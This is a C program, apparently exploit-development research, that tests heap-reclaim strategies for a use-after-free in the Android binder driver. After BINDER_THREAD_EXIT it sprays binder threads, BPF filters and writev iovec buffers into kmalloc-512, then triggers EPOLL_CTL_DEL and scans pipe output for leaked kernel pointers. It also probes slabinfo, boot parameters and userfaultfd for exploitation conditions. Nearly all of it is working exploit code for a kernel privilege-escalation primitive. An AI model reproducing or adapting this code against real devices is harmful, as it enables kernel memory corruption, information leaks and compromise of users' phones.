/*
 * slab_final_test.c — Comprehensive slab reclaim test
 *
 * Tests multiple strategies for reclaiming freed binder_thread:
 *
 * Strategy 1: Self-reclaim (binder_thread sprays binder_thread)
 *   - Open many binder fds, create threads in each
 *   - Free target thread, spray more binder threads
 *   - If same-callsite reclaim works, a new binder_thread lands in freed slot
 *   - Detection: EPOLL_CTL_DEL corrupts the new thread, check for crash/behavior
 *
 * Strategy 2: Massive slab exhaustion + targeted iovec
 *   - Exhaust kmalloc-512 with thousands of BPF filters
 *   - Free binder_thread (now the ONLY free slot)
 *   - Single writev with iovec → MUST land in freed slot
 *
 * Strategy 3: RCU grace period awareness
 *   - Free binder_thread, wait varying times (1ms, 10ms, 100ms, 500ms)
 *   - Then spray iovec copies
 *   - Tests whether kfree_rcu delays are the issue
 *
 * Strategy 4: Cross-page reclaim via slab drain
 *   - Allocate until slab page is full, free ALL objects on that page
 *   - Page returns to page allocator, can be reclaimed by different cache
 *
 * Strategy 5: Check /proc/slabinfo readability
 *
 * Strategy 6: Check userfaultfd availability
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o slab_final_test slab_final_test.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <linux/filter.h>
#include <poll.h>
#include <time.h>

/* Binder definitions */
#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)
#define BINDER_VERSION      _IOWR('b', 9, struct { signed long protocol_version; })
#define BINDER_WRITE_READ   _IOWR('b', 1, struct binder_write_read)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

#define BC_ENTER_LOOPER _IO('c', 13)

#define FILL_BYTE  0xAA
#define MARK_BYTE  0xBB

/* userfaultfd syscall number for ARM64 */
#ifndef __NR_userfaultfd
#define __NR_userfaultfd 282
#endif

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

/* Open binder fd and enter looper, return fd (-1 on failure) */
static int open_binder_looper(void) {
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    void *m = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
    if (m == MAP_FAILED) { close(fd); return -1; }

    struct { signed long protocol_version; } ver;
    ioctl(fd, BINDER_VERSION, &ver);

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (unsigned long)&cmd;
    ioctl(fd, BINDER_WRITE_READ, &bwr);

    /* Don't unmap — kernel needs the reference */
    return fd;
}

/* Create a BPF socket with a filter of given instruction count */
static int create_bpf_socket(int n_insns) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    struct sock_filter *insns = calloc(n_insns, sizeof(struct sock_filter));
    /* Fill with valid BPF instructions: return 0 */
    for (int i = 0; i < n_insns - 1; i++) {
        insns[i].code = BPF_LD | BPF_W | BPF_ABS;
        insns[i].k = 0;
    }
    insns[n_insns - 1].code = BPF_RET | BPF_K;
    insns[n_insns - 1].k = 0;

    struct sock_fprog prog = { .len = n_insns, .filter = insns };
    int ret = setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    free(insns);

    if (ret < 0) { close(sock); return -1; }
    return sock;
}

struct writev_ctx {
    int rd;
    int wr;
    int n_iovecs;
    volatile int ready;
    ssize_t result;
    int err;
};

static void *writev_worker(void *arg) {
    struct writev_ctx *ctx = arg;
    struct iovec *iov = calloc(ctx->n_iovecs, sizeof(struct iovec));
    char *bufs[64];

    for (int i = 0; i < ctx->n_iovecs && i < 64; i++) {
        bufs[i] = malloc(4);
        memset(bufs[i], MARK_BYTE, 4);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = 4;
    }

    ctx->ready = 1;
    ctx->result = writev(ctx->wr, iov, ctx->n_iovecs);
    ctx->err = errno;

    for (int i = 0; i < ctx->n_iovecs && i < 64; i++) free(bufs[i]);
    free(iov);
    return NULL;
}

/* Check pipe data for corruption */
static int check_pipe_data(int thread_idx, int rd_fd, int wr_fd, pthread_t tid,
                          int n_iovecs, int verbose) {
    char *buf = malloc(131072);
    int fl = fcntl(rd_fd, F_GETFL);

    /* Non-blocking drain */
    fcntl(rd_fd, F_SETFL, fl | O_NONBLOCK);
    int drained = 0;
    for (int attempt = 0; attempt < 100; attempt++) {
        ssize_t r = read(rd_fd, buf + drained, 131072 - drained);
        if (r > 0) drained += r;
        else usleep(1000);
        if (drained >= 131072 - 4096) break;
    }

    close(wr_fd);
    pthread_join(tid, NULL);

    /* Read remaining */
    fcntl(rd_fd, F_SETFL, fl);
    while (drained < 131072) {
        ssize_t r = read(rd_fd, buf + drained, 131072 - drained);
        if (r <= 0) break;
        drained += r;
    }
    close(rd_fd);

    /* Find MARK region */
    int mark_start = -1;
    for (int j = 0; j < drained; j++) {
        if ((unsigned char)buf[j] != FILL_BYTE) {
            mark_start = j;
            break;
        }
    }

    int leak = 0;
    if (mark_start >= 0) {
        int markers = 0, alien = 0;
        int first_alien = -1;
        uint64_t alien_val = 0;

        for (int j = mark_start; j < drained; j++) {
            unsigned char b = (unsigned char)buf[j];
            if (b == MARK_BYTE) markers++;
            else if (b != FILL_BYTE) {
                alien++;
                if (first_alien < 0) {
                    first_alien = j - mark_start;
                    if (j + 8 <= drained)
                        memcpy(&alien_val, &buf[j], 8);
                }
            }
        }

        int expected = n_iovecs * 4;
        if (alien > 0) {
            leak = 1;
            printf("\n  >>> ALIEN DATA in thread[%d]! <<<\n", thread_idx);
            printf("  writev region at byte %d, %d markers + %d ALIEN (expected %d)\n",
                   mark_start, markers, alien, expected);
            printf("  first alien at +%d, val=0x%016llx\n",
                   first_alien, (unsigned long long)alien_val);

            if ((alien_val & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL ||
                (alien_val & 0xFFFFFF0000000000ULL) == 0xffffff8000000000ULL)
                printf("  >>> KERNEL POINTER DETECTED! <<<\n");

            /* Hex dump */
            printf("  hex dump:\n  ");
            int ds = mark_start + (first_alien > 16 ? first_alien - 16 : 0);
            for (int j = ds; j < ds + 96 && j < drained; j++) {
                printf("%02x ", (unsigned char)buf[j]);
                if ((j - ds + 1) % 16 == 0) printf("\n  ");
            }
            printf("\n");
        } else {
            /* Also check for SHORT WRITE (fewer markers than expected) */
            if (markers < expected && verbose) {
                printf("  thread[%d]: SHORT WRITE! %d/%d markers (possible iov corruption)\n",
                       thread_idx, markers, expected);
                leak = 2;  /* possible corruption via EFAULT */
            } else if (verbose && (thread_idx < 3 || thread_idx % 100 == 0)) {
                printf("  thread[%d]: %d/%d markers OK\n", thread_idx, markers, expected);
            }
        }
    } else if (verbose && thread_idx == 0) {
        printf("  thread[%d]: all FILL, writev data missing\n", thread_idx);
    }

    free(buf);
    return leak;
}

/*========== STRATEGY 1: Self-reclaim ==========*/
static void test_self_reclaim(void) {
    printf("\n=== STRATEGY 1: Self-reclaim (binder_thread → binder_thread) ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        pin_cpu(0);

        int target_fd = open_binder_looper();
        if (target_fd < 0) { printf("  target binder open failed\n"); _exit(1); }

        /* Add target to epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = target_fd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, target_fd, &ev);

        /* Free target binder_thread */
        ioctl(target_fd, BINDER_THREAD_EXIT, NULL);
        printf("  target thread freed\n");

        /* Spray binder_thread objects to reclaim the freed slot */
        int spray_fds[512];
        int spray_count = 0;
        for (int i = 0; i < 512; i++) {
            spray_fds[i] = open_binder_looper();
            if (spray_fds[i] < 0) break;
            spray_count++;
        }
        printf("  sprayed %d binder_thread objects\n", spray_count);

        /* Trigger EPOLL_CTL_DEL — if a spray thread reclaimed the slot,
         * list_del will corrupt the new binder_thread */
        ev.events = EPOLLIN;
        int ret = epoll_ctl(epfd, EPOLL_CTL_DEL, target_fd, &ev);
        printf("  EPOLL_CTL_DEL ret=%d errno=%d\n", ret, errno);

        /* Check if any spray fd now behaves anomalously */
        int anomalies = 0;
        for (int i = 0; i < spray_count; i++) {
            /* Try poll on each spray fd — if corrupted, might behave differently */
            struct pollfd pfd = { .fd = spray_fds[i], .events = POLLIN };
            int pr = poll(&pfd, 1, 0);  /* non-blocking */
            if (pr < 0 || (pfd.revents & POLLERR) || (pfd.revents & POLLHUP)) {
                printf("  spray[%d] ANOMALY: poll ret=%d revents=0x%04x\n",
                       i, pr, pfd.revents);
                anomalies++;
            }

            /* Try ioctl — if wait_queue corrupted, might crash or error differently */
            struct binder_write_read bwr;
            memset(&bwr, 0, sizeof(bwr));
            bwr.read_size = 32;
            char rbuf[32];
            bwr.read_buffer = (unsigned long)rbuf;
            /* Non-blocking read attempt */
            int fl = fcntl(spray_fds[i], F_GETFL);
            fcntl(spray_fds[i], F_SETFL, fl | O_NONBLOCK);
            int ir = ioctl(spray_fds[i], BINDER_WRITE_READ, &bwr);
            fcntl(spray_fds[i], F_SETFL, fl);
            if (ir < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                printf("  spray[%d] IOCTL ANOMALY: ret=%d errno=%d\n", i, ir, errno);
                anomalies++;
            }
        }

        printf("  anomalies detected: %d/%d\n", anomalies, spray_count);

        for (int i = 0; i < spray_count; i++) close(spray_fds[i]);
        close(epfd);
        close(target_fd);
        _exit(anomalies > 0 ? 42 : 0);
    }

    alarm(30);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  result: %s (exit=%d)\n",
               WEXITSTATUS(status) == 42 ? "ANOMALY!" : "no anomaly",
               WEXITSTATUS(status));
    else if (WIFSIGNALED(status))
        printf("  KILLED by signal %d — possible kernel corruption!\n", WTERMSIG(status));
}

/*========== STRATEGY 2: Massive exhaustion + targeted iovec ==========*/
static void test_exhaustion_iovec(int exhaust_count, int n_iovecs) {
    int iov_bytes = n_iovecs * 16;
    printf("\n=== STRATEGY 2: Exhaust %d + iovec %d (%d bytes) ===\n",
           exhaust_count, n_iovecs, iov_bytes);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        pin_cpu(0);

        /* Step 1: Exhaust kmalloc-512 with BPF filters */
        /* BPF filter struct: n_insns * sizeof(sock_filter) = n_insns * 8 bytes
         * For kmalloc-512: need 33-64 instructions (264-512 bytes) */
        int bpf_insns = 40;  /* 40 * 8 = 320 bytes internal → kmalloc-512 */

        int *exhaust_socks = calloc(exhaust_count, sizeof(int));
        int created = 0;
        for (int i = 0; i < exhaust_count; i++) {
            exhaust_socks[i] = create_bpf_socket(bpf_insns);
            if (exhaust_socks[i] < 0) break;
            created++;
        }
        printf("  exhaustion: %d/%d BPF sockets created\n", created, exhaust_count);

        /* Step 2: Open binder, add to epoll, free thread */
        int bfd = open_binder_looper();
        if (bfd < 0) { printf("  binder open failed\n"); _exit(1); }

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  binder_thread freed (only free slot in exhausted cache?)\n");

        /* Step 3: Create ONE writev with matching iovec size */
        int p[2];
        pipe(p);

        /* Fill pipe */
        int fl = fcntl(p[1], F_GETFL);
        fcntl(p[1], F_SETFL, fl | O_NONBLOCK);
        char fb[4096];
        memset(fb, FILL_BYTE, sizeof(fb));
        while (write(p[1], fb, sizeof(fb)) > 0);
        fcntl(p[1], F_SETFL, fl);

        struct writev_ctx ctx = { .rd = p[0], .wr = p[1], .n_iovecs = n_iovecs, .ready = 0 };
        pthread_t tid;
        pthread_create(&tid, NULL, writev_worker, &ctx);
        while (!ctx.ready) usleep(100);
        usleep(5000);

        printf("  single writev thread blocking\n");

        /* Step 4: EPOLL_CTL_DEL */
        ev.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL done\n");

        /* Step 5: Check pipe data */
        int leak = check_pipe_data(0, p[0], p[1], tid, n_iovecs, 1);

        /* Cleanup */
        for (int i = 0; i < created; i++) close(exhaust_socks[i]);
        free(exhaust_socks);
        close(epfd);
        close(bfd);
        _exit(leak > 0 ? 42 : 0);
    }

    alarm(60);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  result: %s\n", WEXITSTATUS(status) == 42 ? "LEAK!" : "no leak");
    else if (WIFSIGNALED(status))
        printf("  KILLED signal %d\n", WTERMSIG(status));
}

/*========== STRATEGY 3: RCU delay testing ==========*/
static void test_rcu_delay(int delay_us, int n_threads) {
    printf("\n=== STRATEGY 3: RCU delay %dms, %d threads ===\n", delay_us/1000, n_threads);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        pin_cpu(0);

        int bfd = open_binder_looper();
        if (bfd < 0) { _exit(1); }

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Free binder_thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);

        /* Wait for RCU grace period */
        usleep(delay_us);
        printf("  waited %dms after free\n", delay_us/1000);

        /* Now spray iovec copies */
        int n_iovecs = 19;  /* 304 bytes → kmalloc-512 */
        pthread_t *tids = calloc(n_threads, sizeof(pthread_t));
        struct writev_ctx *ctxs = calloc(n_threads, sizeof(struct writev_ctx));
        int ok = 0;

        for (int i = 0; i < n_threads; i++) {
            int p[2];
            if (pipe(p) < 0) break;
            ctxs[i].rd = p[0];
            ctxs[i].wr = p[1];
            ctxs[i].n_iovecs = n_iovecs;
            ctxs[i].ready = 0;

            int fl = fcntl(p[1], F_GETFL);
            fcntl(p[1], F_SETFL, fl | O_NONBLOCK);
            char fb[4096];
            memset(fb, FILL_BYTE, sizeof(fb));
            while (write(p[1], fb, sizeof(fb)) > 0);
            fcntl(p[1], F_SETFL, fl);

            if (pthread_create(&tids[i], NULL, writev_worker, &ctxs[i]) != 0) break;
            ok++;
            while (!ctxs[i].ready) usleep(100);
        }
        /* Brief settle time for all iovec copies to be in kernel */
        usleep(5000);
        printf("  %d writev threads blocking\n", ok);

        /* Trigger */
        ev.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);

        /* Check all pipes */
        int leaks = 0;
        for (int i = 0; i < ok; i++) {
            int l = check_pipe_data(i, ctxs[i].rd, ctxs[i].wr, tids[i], n_iovecs, (i < 3));
            if (l) leaks++;
        }

        printf("  leaks: %d/%d\n", leaks, ok);
        free(tids);
        free(ctxs);
        close(epfd);
        close(bfd);
        _exit(leaks > 0 ? 42 : 0);
    }

    alarm(60);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  result: %s\n", WEXITSTATUS(status) == 42 ? "LEAK!" : "no leak");
    else if (WIFSIGNALED(status))
        printf("  KILLED signal %d\n", WTERMSIG(status));
}

/*========== STRATEGY 5/6: Info gathering ==========*/
static void check_system_info(void) {
    printf("\n=== SYSTEM INFO ===\n");

    /* /proc/slabinfo */
    int fd = open("/proc/slabinfo", O_RDONLY);
    if (fd >= 0) {
        char buf[8192];
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            printf("  /proc/slabinfo READABLE!\n");
            /* Find kmalloc-512 line */
            char *line = buf;
            while (*line) {
                if (strncmp(line, "kmalloc-512", 11) == 0 ||
                    strncmp(line, "usercopy-kmalloc-512", 20) == 0 ||
                    strncmp(line, "dma-kmalloc-512", 15) == 0) {
                    char *nl = strchr(line, '\n');
                    if (nl) *nl = 0;
                    printf("  %s\n", line);
                    if (nl) *nl = '\n';
                }
                char *nl = strchr(line, '\n');
                if (!nl) break;
                line = nl + 1;
            }
        }
    } else {
        printf("  /proc/slabinfo: %s\n", strerror(errno));
    }

    /* /proc/buddyinfo */
    fd = open("/proc/buddyinfo", O_RDONLY);
    if (fd >= 0) {
        char buf[4096];
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            printf("  /proc/buddyinfo:\n%s\n", buf);
        }
    } else {
        printf("  /proc/buddyinfo: %s\n", strerror(errno));
    }

    /* userfaultfd */
    int uffd = syscall(__NR_userfaultfd, 0);
    if (uffd >= 0) {
        printf("  userfaultfd: AVAILABLE (fd=%d)\n", uffd);
        close(uffd);
    } else {
        printf("  userfaultfd: %s (errno=%d)\n", strerror(errno), errno);
    }

    /* Check ulimit for file descriptors */
    fd = 0;
    int max_fds = 0;
    int *test_fds = malloc(16384 * sizeof(int));
    for (int i = 0; i < 16384; i++) {
        test_fds[i] = open("/dev/null", O_RDONLY);
        if (test_fds[i] < 0) break;
        max_fds++;
    }
    for (int i = 0; i < max_fds; i++) close(test_fds[i]);
    free(test_fds);
    printf("  max FDs available: ~%d\n", max_fds);

    /* Check kernel version for CONFIG options */
    fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        char buf[512];
        int n = read(fd, buf, sizeof(buf) - 1);
        if (n > 0) { buf[n] = 0; printf("  kernel: %s", buf); }
        close(fd);
    }

    /* Check /proc/config.gz existence */
    fd = open("/proc/config.gz", O_RDONLY);
    if (fd >= 0) {
        printf("  /proc/config.gz: EXISTS! (kernel config available)\n");
        close(fd);
    } else {
        printf("  /proc/config.gz: %s\n", strerror(errno));
    }

    /* Check slab_nomerge boot param indicator */
    fd = open("/proc/cmdline", O_RDONLY);
    if (fd >= 0) {
        char buf[4096];
        int n = read(fd, buf, sizeof(buf) - 1);
        if (n > 0) {
            buf[n] = 0;
            printf("  cmdline: %s\n", buf);
            if (strstr(buf, "slab_nomerge"))
                printf("  >>> slab_nomerge DETECTED! <<<\n");
            if (strstr(buf, "slub_debug"))
                printf("  >>> slub_debug DETECTED! <<<\n");
        }
        close(fd);
    }
}

/*========== STRATEGY 4: Timing-precise single-shot ==========*/
static void test_timing_precise(void) {
    printf("\n=== STRATEGY 4: Timing-precise single-shot ===\n");
    printf("  (free binder_thread, immediately allocate single matching iovec)\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        pin_cpu(0);

        int leaks = 0;

        for (int round = 0; round < 100; round++) {
            int bfd = open_binder_looper();
            if (bfd < 0) continue;

            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            /* Pre-create pipe and fill it */
            int p[2];
            pipe(p);
            int fl = fcntl(p[1], F_GETFL);
            fcntl(p[1], F_SETFL, fl | O_NONBLOCK);
            char fb[4096];
            memset(fb, FILL_BYTE, sizeof(fb));
            while (write(p[1], fb, sizeof(fb)) > 0);
            fcntl(p[1], F_SETFL, fl);

            /* Pre-create writev thread args */
            struct writev_ctx ctx = { .rd = p[0], .wr = p[1], .n_iovecs = 19, .ready = 0 };
            pthread_t tid;

            /* Free binder_thread AND immediately start writev */
            ioctl(bfd, BINDER_THREAD_EXIT, NULL);
            /* NO DELAY — immediately create writev thread */
            pthread_create(&tid, NULL, writev_worker, &ctx);
            while (!ctx.ready) usleep(10);
            usleep(1000);  /* minimal wait for writev to block */

            /* Trigger */
            ev.events = EPOLLIN;
            epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);

            /* Check */
            int l = check_pipe_data(round, p[0], p[1], tid, 19, (round < 3));
            if (l) leaks++;

            close(epfd);
            close(bfd);
        }

        printf("  leaks: %d/100 rounds\n", leaks);
        _exit(leaks > 0 ? 42 : 0);
    }

    alarm(120);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);

    if (WIFEXITED(status))
        printf("  result: %s\n", WEXITSTATUS(status) == 42 ? "LEAK!" : "no leak");
    else if (WIFSIGNALED(status))
        printf("  KILLED signal %d\n", WTERMSIG(status));
}

int main(void) {
    printf("=== SLAB FINAL TEST — Comprehensive reclaim strategies ===\n");
    printf("uid=%u\n", getuid());

    /* System info first */
    check_system_info();

    /* Strategy 1: Self-reclaim */
    test_self_reclaim();

    /* Strategy 2: Massive exhaustion + iovec */
    test_exhaustion_iovec(1024, 19);   /* 1024 exhaust, 304-byte iovec */
    test_exhaustion_iovec(2048, 19);   /* 2048 exhaust */
    test_exhaustion_iovec(4096, 19);   /* 4096 exhaust */

    /* Strategy 3: RCU delay */
    test_rcu_delay(1000, 128);      /* 1ms delay */
    test_rcu_delay(10000, 128);     /* 10ms delay */
    test_rcu_delay(100000, 128);    /* 100ms delay */
    test_rcu_delay(500000, 128);    /* 500ms delay */

    /* Strategy 4: Timing-precise single shot */
    test_timing_precise();

    printf("\n=== ALL STRATEGIES TESTED ===\n");
    return 0;
}
